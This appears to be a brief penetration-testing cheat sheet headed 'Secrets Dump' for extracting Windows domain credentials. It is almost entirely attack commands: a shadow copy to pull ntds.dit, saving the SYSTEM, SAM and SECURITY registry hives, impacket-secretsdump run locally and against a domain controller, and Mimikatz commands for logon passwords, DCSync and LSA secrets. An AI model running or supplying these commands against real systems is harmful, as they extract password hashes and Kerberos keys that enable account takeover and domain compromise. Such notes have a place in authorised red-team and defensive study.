# Secrets Dump
## Domain hashes & kerberos keys
#### Local
vssadmin create shadow /for=C:
copy PATH \Windows\NTDS\ntds.dit C:\Windows\Temp\ntds.dit
reg SAVE HKLM\SYSTEM C:\Windows\Temp\SYS
vssadmin delete shadows /shadow=ID
`impacket-secretsdump -ntds <NTDS.DIT> -system <SYS> LOCAL`

#### Remote
`impacket-secretsdump -just-dc '<DOMAIN>/<USER>:<PASS>@<DC_IP>'`






crackmapexec

Check with `Privilege::debug` if the right priv are set (admin).

Sekurlsa::logonpasswords
Lsadump::dcsync /user:\<USER\> /domain:\<DOMAIN\>
Lsadump::lsa /inject /name:\<USER\>

```
reg save hklm\sam c:\temp\sam.save
reg save hklm\security c:\temp\security.save
reg save hklm\system c:\temp\system.save
```
